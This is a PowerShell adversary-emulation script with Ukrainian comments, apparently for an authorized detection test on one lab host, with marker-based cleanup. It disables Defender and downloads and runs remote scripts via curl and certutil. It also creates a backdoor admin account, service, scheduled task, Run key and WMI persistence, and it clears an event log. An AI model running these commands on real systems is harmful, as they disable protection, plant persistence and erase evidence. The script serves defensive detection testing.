<#
  recon-lab.ps1 — Основний оркестратор емуляції IR-01 (ENERGY / testPC_2, авторизований лабораторний тест).
  Фази: 0 брутфорс -> 1 оглядка -> 2 розвідка -> 3 вимкнення Defender -> 4 завантаження+запуск winpeas-lite
        -> 5 закреплення (пустушки) -> 6 сліди + ПОВНЕ прибирання.
  Усі об'єкти містять маркер; усі «шкідливі» дії — пустушки без реального впливу.
  Прибирання виконується у finally — навіть якщо щось впаде посередині.

  Запуск (крок за кроком вручну):   . .\recon-lab.ps1 ; Start-Recon
  Запуск (автоматично, з паузами):  . .\recon-lab.ps1 ; Start-Recon -Auto
  Лише прибирання:                  . .\recon-lab.ps1 ; Invoke-Cleanup -Marker RECON01_....  (або -Last)

  ЛИШЕ ДЛЯ ТЕСТОВОГО ХОСТА ENERGY. Не запускати деінде.
#>

$RepoRaw = 'https://raw.githubusercontent.com/egwyl666/test_winpeace/main'
$Script:Delay = [int]($env:RV_DELAY | ForEach-Object { if ($_) { $_ } else { 3 } })

function New-Marker { "RECON01_" + (Get-Date -Format 'yyyyMMdd_HHmmss') }
function Phase($n, $t) { Write-Host "`n########## ФАЗА $n — $t ##########" -ForegroundColor Magenta }
function Pause-Phase { param($auto) if ($auto) { Start-Sleep -Seconds $Script:Delay } }

function Get-FromRepo {
  param([string]$Name, [string]$Dest)
  try { & curl.exe -s -o $Dest "$RepoRaw/$Name" } catch {}
  if (-not (Test-Path $Dest)) { certutil -urlcache -split -f "$RepoRaw/$Name" $Dest | Out-Null }
  return (Test-Path $Dest)
}

function Start-Recon {
  [CmdletBinding()] param([switch]$Auto, [switch]$NoBrute, [switch]$NoWMI, [switch]$NoStartup)
  if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')) {
    Write-Host 'Потрібні права адміністратора.' -ForegroundColor Red; return
  }
  $m = New-Marker
  $Global:RVMarker = $m
  $dir = "C:\$m"; New-Item -ItemType Directory -Force $dir | Out-Null
  $start = Get-Date
  Write-Host "MARKER: $m" -ForegroundColor Green
  Write-Host "START : $($start.ToUniversalTime().ToString('u'))" -ForegroundColor Green

  try {
    # ---- 0. Brute force ----
    if (-not $NoBrute) {
      Phase 0 'Initial Access (брутфорс)'
      $bf = "$dir\bruteforce.ps1"
      if (Get-FromRepo 'bruteforce.ps1' $bf) { & powershell -ExecutionPolicy Bypass -File $bf -Marker $m -Attempts 6 }
      else { Write-Host '  bruteforce.ps1 не завантажено' -ForegroundColor Yellow }
      Pause-Phase $Auto
    }

    # ---- 1. Quick look ----
    Phase 1 'Вхід і швидка оглядка'
    cmd /c "echo $m & whoami & hostname" ; systeminfo | Out-Null
    Pause-Phase $Auto

    # ---- 2. Discovery ----
    Phase 2 'Основна розвідка'
    whoami /all | Out-Null; whoami /priv | Out-Null
    net user | Out-Null; net localgroup administrators | Out-Null; net group 2>$null | Out-Null
    ipconfig /all | Out-Null; arp -a | Out-Null; net view 2>$null | Out-Null; nslookup $env:COMPUTERNAME 2>$null | Out-Null
    1..20 | ForEach-Object { Test-NetConnection 127.0.0.1 -Port $_ -WarningAction SilentlyContinue | Out-Null }  # легкий порт-скан (localhost)
    Get-LocalUser | Out-Null; Get-NetTCPConnection -State Listen | Out-Null; Get-Process | Select-Object -First 20 | Out-Null
    cmd /c "dir \\127.0.0.1\C$" | Out-Null
    Pause-Phase $Auto

    # ---- 3. Defense evasion ----
    Phase 3 'Протидія захисту (Defender)'
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
    $rtp = (Get-MpPreference).DisableRealtimeMonitoring
    Write-Host ("  Defender RealtimeMonitoring disabled = {0}" -f $rtp) -ForegroundColor $(if ($rtp) { 'Green' } else { 'Yellow' })
    if (-not $rtp) { Write-Host '  (ймовірно Tamper Protection — занотувати)' -ForegroundColor Yellow }
    Pause-Phase $Auto

    # ---- 4. Tool download + run ----
    Phase 4 'Завантаження і запуск winpeas-lite'
    $tool = "$dir\winpeas-lite.ps1"
    if (Get-FromRepo 'winpeas-lite.ps1' $tool) { & powershell -ExecutionPolicy Bypass -File $tool -Marker $m | Out-Null; Write-Host '  winpeas-lite виконано' -ForegroundColor Green }
    else { Write-Host '  winpeas-lite.ps1 не завантажено' -ForegroundColor Yellow }
    Pause-Phase $Auto

    # ---- 5. Persistence (пустушки) ----
    Phase 5 'Закреплення'
    sc.exe create "${m}_svc" binPath= "C:\Windows\System32\cmd.exe /c exit" | Out-Null            # 4697/7045
    net user "${m}_svc" 'P@ssw0rd_1' /add | Out-Null                                              # 4720
    net localgroup administrators "${m}_svc" /add | Out-Null                                      # 4732
    schtasks /create /tn "${m}_task" /tr notepad.exe /sc onlogon /f | Out-Null                    # 4698
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v $m /d "C:\$m\x.exe" /f | Out-Null  # Sysmon 13
    if (-not $NoStartup) {
      "rem $m" | Out-File "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$m.cmd" -Encoding ascii  # Sysmon 11 + FIM
    }
    if (-not $NoWMI) {
      Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name=$m;EventNamespace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"} | Out-Null  # 5861
    }
    Write-Host '  закреплення створено (пустушки)' -ForegroundColor Green
    Pause-Phase $Auto

    # ---- 6. Tracks ----
    Phase 6 'Сліди (очищення тестового журналу)'
    wevtutil cl "Windows PowerShell"   # 104 (НЕ Security)
    Write-Host '  журнал "Windows PowerShell" очищено (подія 104)' -ForegroundColor Green
  }
  finally {
    Invoke-Cleanup -Marker $m
    $end = Get-Date
    Write-Host "`nMARKER: $m" -ForegroundColor Green
    Write-Host ("WINDOW: {0}  ->  {1}  (UTC)" -f $start.ToUniversalTime().ToString('u'), $end.ToUniversalTime().ToString('u')) -ForegroundColor Green
    Write-Host "Пошук у Wazuh: agent.name:testPC_2 and full_log:$m" -ForegroundColor Green
  }
}

function Invoke-Cleanup {
  [CmdletBinding()] param([string]$Marker, [switch]$Last, [switch]$Verify)
  if ($Last -or -not $Marker) { $Marker = $Global:RVMarker }
  if (-not $Marker) { Write-Host 'Вкажіть -Marker RECON01_... або -Last' -ForegroundColor Yellow; return }
  Write-Host "CLEANUP marker $Marker" -ForegroundColor Cyan

  # Defender назад
  Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
  Remove-MpPreference -ExclusionPath "C:\$Marker" -ErrorAction SilentlyContinue

  sc.exe delete "${Marker}_svc" 2>$null | Out-Null
  schtasks /delete /tn "${Marker}_task" /f 2>$null | Out-Null
  net localgroup administrators "${Marker}_svc" /delete 2>$null | Out-Null
  net user "${Marker}_svc" /delete 2>$null | Out-Null
  net user "${Marker}_user" /delete 2>$null | Out-Null
  reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v $Marker /f 2>$null | Out-Null
  Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$Marker.cmd" -Force -ErrorAction SilentlyContinue
  Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$Marker'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
  Remove-Item "C:\$Marker" -Recurse -Force -ErrorAction SilentlyContinue

  if ($Verify) {
    Write-Host 'Залишки з маркером:' -ForegroundColor Cyan
    $left = @()
    if (Get-Service "${Marker}_svc" -EA 0) { $left += 'service' }
    if (schtasks /query /tn "${Marker}_task" 2>$null) { $left += 'task' }
    if (net user "${Marker}_svc" 2>$null) { $left += 'user_svc' }
    if (net user "${Marker}_user" 2>$null) { $left += 'user' }
    if (Test-Path "C:\$Marker") { $left += 'dir' }
    if ($left.Count) { Write-Host ("  ЛИШИЛОСЬ: " + ($left -join ', ')) -ForegroundColor Yellow } else { Write-Host '  усе прибрано' -ForegroundColor Green }
  }
  $r = (Get-MpPreference).DisableRealtimeMonitoring
  Write-Host ("  Defender RealtimeMonitoring disabled = {0} (очікувано False)" -f $r) -ForegroundColor $(if ($r) { 'Yellow' } else { 'Green' })
  Write-Host 'CLEANUP DONE' -ForegroundColor Green
}

Write-Host 'recon-lab завантажено. Команди: Start-Recon [-Auto] [-NoBrute] [-NoWMI] [-NoStartup] ; Invoke-Cleanup -Last -Verify' -ForegroundColor Cyan
